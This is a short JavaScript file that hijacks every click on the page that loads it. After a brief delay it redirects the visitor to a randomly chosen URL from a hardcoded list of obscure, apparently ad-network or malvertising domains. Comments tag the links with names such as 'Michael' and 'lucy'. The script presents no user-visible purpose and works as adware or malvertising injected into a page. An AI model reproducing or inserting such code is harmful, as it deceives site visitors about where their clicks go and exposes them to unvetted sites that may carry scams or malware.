function init() {
  var arr = [
    // hil: Michael(yoo) 
    "https://ruddy-boyfriend.com/bi3.VH0XPB3Spiv/bBm/VzJvZDDO0w1QN/DCQI5LOXD/Yx2cLXTIUD0ZNnDvk/4lNhjdcM",

    // mon: lucy
    // "https://phuruxoods.com/4/7683326",
    "https://whauzavouweb.com/4/7683329",
    // "https://naglelri.net/4/7683327",
    // "https://fouwhigrezi.net/4/7683328",
    // "https://boovoogie.net/4/7683330",
    // "https://rangauck.com/4/7683319",

    // "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);